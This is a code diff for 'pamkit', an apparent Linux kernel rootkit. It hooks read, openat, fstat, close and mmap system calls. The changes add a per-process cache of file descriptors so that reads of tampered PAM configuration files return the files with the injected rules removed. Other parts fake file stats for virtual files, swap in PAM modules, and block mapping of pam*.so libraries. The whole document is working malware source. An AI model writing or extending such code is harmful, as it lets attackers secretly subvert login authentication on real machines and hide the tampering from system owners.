@@ -1,7 +1,9 @@
 #include "hook_defs.h"
 #include "pam_config.h"
 #include "vfile.h"
+#include "../net.h"
 #include "../util/log.h"
+#include "../util/user.h"
 
 #include <linux/compiler.h>
 #include <linux/dcache.h>
@@ -13,6 +15,7 @@
 #include <linux/fs.h>
 #include <linux/fs_struct.h>
 #include <linux/ftrace.h>
+#include "linux/hashtable.h"
 #include <linux/io.h>
 #include <linux/kernel.h>
 #include <linux/mm.h>
@@ -25,65 +28,78 @@
 #include <linux/stat.h>
 #include <linux/string.h>
 #include <linux/syscalls.h>
-#include <linux/uaccess.h>
 #include <linux/version.h>
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
-static void *
-get_data_from_usr(const void __user *data, const size_t max_size)
+static DEFINE_SPINLOCK(pid_fd_to_dmod_replacement_cache_lock);
+static DEFINE_HASHTABLE(pid_fd_to_dmod_replacement_cache, 16);
+
+struct replacement_cache_entry {
+    pid_t pid;
+    unsigned int fd;
+    disk_mod_config_t *disk_mod_config;
+    struct hlist_node node;
+};
+typedef struct replacement_cache_entry replacement_cache_entry_t;
+
+static inline int
+add_replacement_cache_entry(const pid_t pid, const unsigned int fd, disk_mod_config_t *disk_mod_config)
 {
-    void *kbuffer = kzalloc(max_size, GFP_KERNEL);
-    if (!kbuffer) {
-        prerr_ratelimited("Allocating buffer for copying user data failed");
-        return NULL;
+    replacement_cache_entry_t *entry;
+    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);
+
+    entry = kzalloc(sizeof(replacement_cache_entry_t), GFP_KERNEL);
+    if (!entry) {
+        prerr_ratelimited("Failed to allocate memory for 'replacement_cache_entry' (pid=%d, fd=%d)", pid, fd);
+        spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
+        return -ENOMEM;
     }
 
-    if (copy_from_user(kbuffer, data, max_size)) {
-        prerr_ratelimited("Copying user data to kernel buffer failed");
-        kfree(kbuffer);
-        return NULL;
-    }
+    entry->pid = pid;
+    entry->fd = fd;
+    entry->disk_mod_config = disk_mod_config;
+    hash_add(pid_fd_to_dmod_replacement_cache, &entry->node, fd);
 
-    return kbuffer;
-}
-
-static int
-copy_to_usr(void __user *target, const void *source, const size_t size)
-{
-    if (copy_to_user(target, source, size)) {
-        prerr_ratelimited("Failed to copy data to user space");
-        return -EFAULT;
-    }
-
+    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
     return 0;
 }
 
-/* Callee has to explicitly unpin path when no longer needed */
-static struct file *
-get_file_from_fd(const unsigned int fd)
+static inline void
+del_replacement_cache_entry(const pid_t pid, const unsigned int fd)
 {
-    struct file *file;
+    replacement_cache_entry_t *entry;
+    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);
 
-    spin_lock(&current->files->file_lock);
-
-    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
-    file = files_lookup_fd_raw(current->files, fd);
-    #else
-    file = __fcheck_files(current->files, fd);
-    #endif
-
-    if (IS_ERR_OR_NULL(file)) {
-        prwarn("Getting file struct associated with fd '%d' of process '%d' (%s) failed.", fd, task_pid_nr(current), current->comm);
-        goto error_out;
+    hash_for_each_possible(pid_fd_to_dmod_replacement_cache, entry, node, fd) {
+        if (entry->pid == pid && entry->fd == fd) {
+            hash_del_rcu(&entry->node);
+            kfree(entry);
+            spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
+            return;
+        }
     }
 
-    path_get(&file->f_path);
-    spin_unlock(&current->files->file_lock);
-    return file;
+    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
+    return;
+}
 
-error_out:
-    spin_unlock(&current->files->file_lock);
+static inline disk_mod_config_t *
+should_replace(const pid_t pid, const unsigned int fd)
+{
+    disk_mod_config_t *ret_disk_mod_config;
+    replacement_cache_entry_t *entry;
+    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);
+
+    hash_for_each_possible(pid_fd_to_dmod_replacement_cache, entry, node, fd) {
+        if (entry->pid == pid && entry->fd == fd) {
+            ret_disk_mod_config = entry->disk_mod_config;
+            spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
+            return ret_disk_mod_config;
+        }
+    }
+
+    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
     return NULL;
 }
 
@@ -95,7 +111,7 @@ fd_to_filepath(const unsigned int fd)
     char *target_path_name_buffer;
     char *ret_path;
 
-    file = get_file_from_fd(fd);
+    file = fget(fd);
     if (!file) {
         return NULL;
     }
@@ -119,14 +135,13 @@ fd_to_filepath(const unsigned int fd)
     }
 
     kfree(target_path_name_buffer);
-    path_put(&file->f_path);
+    fput(file);
     return ret_path;
 
 error_out_1:
     kfree(target_path_name_buffer);
 error_out_2:
-    path_put(&file->f_path);
-
+    fput(file);
     return NULL;
 }
 
@@ -143,7 +158,7 @@ replace_pam_rules_in_buffer(char __user *buffer, const size_t read_bytes, const 
         return read_bytes;
     }
 
-    modified_usr_buffer = (char *) kzalloc(read_bytes + 1, GFP_KERNEL);
+    modified_usr_buffer = (char *) kvzalloc(read_bytes + 1, GFP_KERNEL);
     if (!modified_usr_buffer) {
         prerr_ratelimited("Failed to allocate memory for 'modified_usr_buffer' (pid=%d, name=%s)", task_pid_nr(current), current->comm);
         return -ENOMEM;
@@ -151,29 +166,30 @@ replace_pam_rules_in_buffer(char __user *buffer, const size_t read_bytes, const 
 
     if (copy_from_user(modified_usr_buffer, buffer, read_bytes)) {
         prerr_ratelimited("Failed to copy user buffer to kernel buffer (pid=%d, name=%s)", task_pid_nr(current), current->comm);
-        kfree(modified_usr_buffer);
+        kvfree(modified_usr_buffer);
         return -EFAULT;
     }
 
     mod_rule_start = strstr(modified_usr_buffer, disk_mod_config->modifications);
     if (!mod_rule_start) {
-        kfree(modified_usr_buffer);
+        kvfree(modified_usr_buffer);
         return read_bytes;
     }
 
     mod_offset = mod_rule_start - modified_usr_buffer;
-    trailing_chars = read_bytes - (mod_offset + disk_mod_config->modifications_len + 1);
+    trailing_chars = read_bytes - (mod_offset + disk_mod_config->modifications_len - 1);
 
-    memmove(mod_rule_start, mod_rule_start + disk_mod_config->modifications_len + 1, trailing_chars);
+    memmove(mod_rule_start, mod_rule_start + disk_mod_config->modifications_len, trailing_chars);
+    memset(mod_rule_start + trailing_chars, '\0', disk_mod_config->modifications_len);
 
-    new_size = read_bytes - (disk_mod_config->modifications_len + 1);
+    new_size = read_bytes - disk_mod_config->modifications_len;
     if (copy_to_usr(buffer, modified_usr_buffer, new_size)) {
         prerr_ratelimited("Failed to copy the buffer with the PAM rule modifications removed into the user buffer");
-        kfree(modified_usr_buffer);
+        kvfree(modified_usr_buffer);
         return -EFAULT;
     }
 
-    kfree(modified_usr_buffer);
+    kvfree(modified_usr_buffer);
     return new_size;
 }
 
@@ -213,7 +229,6 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
 {
     long ret;
     unsigned int fd_arg;
-    char *target_path;
     vfile_t *virtual_file;
     const disk_mod_config_t *disk_mod_config;
 
@@ -223,7 +238,7 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
     fd_arg = fd;
     #endif
 
-    virtual_file = get_vfile(task_pid_nr(current), fd_arg);
+    virtual_file = get_vfile(task_tgid_vnr(current), fd_arg);
     if (unlikely(virtual_file)) {
 
         #ifdef PAMKIT_PTREGS_STUBS
@@ -233,7 +248,6 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
         #endif
 
         put_vfile(virtual_file);
-
         return ret;
     }
 
@@ -242,13 +256,7 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
         return ret;
     }
 
-    /* Check if the underlying file is a modified PAM config file and if this process should read the modified version or not */
-    target_path = fd_to_filepath(fd_arg);
-    if (!target_path) {
-        return ret;
-    }
-
-    disk_mod_config = get_diskmod_config(current->comm, target_path);
+    disk_mod_config = should_replace(task_tgid_vnr(current), fd_arg);
     if (unlikely(disk_mod_config)) {
 
         #ifdef PAMKIT_PTREGS_STUBS
@@ -258,13 +266,6 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
         #endif
     }
 
-    kfree(target_path);
-    return ret;
-}
-
-SYSCALL_HOOK(open, const char __user *filename, int flags, umode_t mode)
-{
-    long ret = SYSCALL_ORIG_OPEN(pt_regs, filename, flags, mode);
     return ret;
 }
 
@@ -288,13 +289,15 @@ SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mo
     void __user *userspace_mitm_module_path;
     virtual_fd_t vfd;
     vf_replacement_rule_t *vf_replacement_rule;
+    char *target_path;
+    disk_mod_config_t *disk_mod_config;
 
     #ifdef PAMKIT_PTREGS_STUBS
     arg_dfd = FIRST_ARG(pt_regs, int);
-    arg_filename = (char *) get_data_from_usr(SECOND_ARG(pt_regs, char*), NAME_MAX * sizeof(char));
+    arg_filename = get_string_from_usr(SECOND_ARG(pt_regs, char*), PATH_MAX * sizeof(char));
     #else
     arg_dfd = dfd;
-    arg_filename = (char *) get_data_from_usr(filename, NAME_MAX * sizeof(char));
+    arg_filename = get_string_from_usr(filename, PATH_MAX * sizeof(char));
     #endif
 
     if (unlikely(!arg_filename)) {
@@ -302,13 +305,13 @@ SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mo
         return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
     }
 
-    /* Note: For now we heuristically work with the given 'filepath' and never try to resolve the absolute path */
+    /* Note: For now we heuristically work with the given 'filepath' and don't try to resolve the absolute path */
 
     vf_replacement_rule = get_vf_replacement_rule(current->comm, arg_filename);
     if (unlikely(vf_replacement_rule)) {
         kfree(arg_filename);
 
-        vfd = create_vfile(task_pid_nr(current), vf_replacement_rule->vfile_data);
+        vfd = create_vfile(task_tgid_vnr(current), vf_replacement_rule->vfile_data);
         if (unlikely(vfd == 0)) {
             prerr_ratelimited("Failed to create virtual file state");
             return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
@@ -367,8 +370,32 @@ SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mo
     return ret;
 
 skip_pam_module_replacement:
+
     kfree(arg_filename);
-    return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
+
+    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
+    if (ret < 0) {
+        return ret;
+    }
+
+    /* Note: Having to resolve the full path is slow. If it is known what files should be targeted and they follow a certain
+                naming pattern, a fast-path check can / should be implemented instead.
+    */
+    target_path = fd_to_filepath(ret);
+    if (!target_path) {
+        return ret;
+    }
+
+    disk_mod_config = get_diskmod_config(current->comm, target_path);
+    if (unlikely(disk_mod_config)) {
+        if (add_replacement_cache_entry(task_tgid_vnr(current), ret, disk_mod_config) != 0) {
+            kfree(target_path);
+            return -1;
+        }
+    }
+
+    kfree(target_path);
+    return ret;
 }
 
 static struct stat *
@@ -404,7 +431,7 @@ SYSCALL_HOOK(fstat, unsigned int fd, struct stat __user *statbuf)
     arg_fd = fd;
     #endif
 
-    virtual_file = get_vfile(task_pid_nr(current), arg_fd);
+    virtual_file = get_vfile(task_tgid_vnr(current), arg_fd);
     if (unlikely(virtual_file)) {
 
         custom_stat = get_bogus_stats(virtual_file->vfile_data->data_len);
@@ -427,42 +454,6 @@ SYSCALL_HOOK(fstat, unsigned int fd, struct stat __user *statbuf)
     return SYSCALL_ORIG_FSTAT(pt_regs, fd, statbuf);
 }
 
-SYSCALL_HOOK(newfstatat, int dfd, const char __user *filename, struct stat __user *statbuf, int flag)
-{
-    long ret;
-    int arg_dfd;
-    struct stat *custom_stat;
-    vfile_t *virtual_file;
-
-    #ifdef PAMKIT_PTREGS_STUBS
-    arg_dfd = FIRST_ARG(pt_regs, int);
-    #else
-    arg_dfd = dfd;
-    #endif
-
-    virtual_file = get_vfile(task_pid_nr(current), arg_dfd);
-    if (unlikely(virtual_file)) {
-
-        custom_stat = get_bogus_stats(virtual_file->vfile_data->data_len);
-        if (!custom_stat) {
-            put_vfile(virtual_file);
-            return -EFAULT;
-        }
-
-        #ifdef PAMKIT_PTREGS_STUBS
-        ret = copy_to_usr(SECOND_ARG(pt_regs, struct stat *), custom_stat, sizeof(struct stat));
-        #else
-        ret = copy_to_usr(statbuf, custom_stat, sizeof(struct stat));
-        #endif
-
-        put_vfile(virtual_file);
-        kfree(custom_stat);
-        return ret;
-    }
-
-    return SYSCALL_ORIG_NEWFSTATAT(pt_regs, dfd, filename, statbuf, flag);
-}
-
 SYSCALL_HOOK(close, int fd)
 {
     int fd_arg;
@@ -474,29 +465,79 @@ SYSCALL_HOOK(close, int fd)
     fd_arg = fd;
     #endif
 
-    virtual_file = get_vfile(task_pid_nr(current), fd_arg);
+    virtual_file = get_vfile(task_tgid_vnr(current), fd_arg);
     if (unlikely(virtual_file)) {
-        delete_vfile(task_pid_nr(current), fd_arg);
+        delete_vfile(task_tgid_vnr(current), fd_arg);
         put_vfile(virtual_file);
         return 0;
     }
+
+    del_replacement_cache_entry(task_tgid_vnr(current), fd_arg);
 
     return SYSCALL_ORIG_CLOSE(pt_regs, fd);
 }
 
 SYSCALL_HOOK(mmap, unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
 {
-    long ret = SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
-    return ret;
+    int fd_arg;
+    int flags_arg;
+    char *target_path;
+    char *last_path_component;
+    char *file_ext;
+
+    #ifdef PAMKIT_PTREGS_STUBS
+    fd_arg = FIFTH_ARG(pt_regs, int);
+    flags_arg = FOURTH_ARG(pt_regs, int);
+    #else
+    fd_arg = fd;
+    flags_arg = flags;
+    #endif
+
+    if (likely(!prevent_pam_mod_mapping)) {
+        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
+    }
+
+    if (fd_arg < 0 || (flags_arg & MAP_ANONYMOUS )) {
+        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
+    }
+
+    target_path = fd_to_filepath(fd_arg);
+    if (!target_path) {
+        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
+    }
+
+    last_path_component = strrchr(target_path, '/');
+    if (!last_path_component) {
+        goto allow_mapping;
+    }
+
+    if (strncmp("/pam", last_path_component, sizeof("/pam") - 1) != 0) {
+        goto allow_mapping;
+    }
+
+    file_ext = strrchr(last_path_component, '.');
+    if (!file_ext) {
+        goto allow_mapping;
+    }
+
+    if (strncmp(".so", file_ext, sizeof(".so") - 1) != 0) {
+        goto allow_mapping;
+    }
+
+    prinfo("Preventing mapping of '%s'", target_path);
+    kfree(target_path);
+    return -1;
+
+allow_mapping:
+    kfree(target_path);
+    return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
 }
 
 hook_data_t pamkit_syscall_hooks[] = {
     GEN_SYSCALL_HOOK_DATA(read),
-    GEN_SYSCALL_HOOK_DATA(open),
     GEN_SYSCALL_HOOK_DATA(openat),
     /* Needs to be defined like this cause of naming inconsistencies in the linux kernel */
     SYSCALL_HOOK_DATA_DEFINE(__syscall_name("fstat"), &SYSCALL_ORIG_NAME(fstat), SYSCALL_HOOK_NAME(fstat), __NR_fstat),
-    GEN_SYSCALL_HOOK_DATA(newfstatat),
     GEN_SYSCALL_HOOK_DATA(close),
     GEN_SYSCALL_HOOK_DATA(mmap),
     SYSCALL_HOOK_DATA_EMPTY
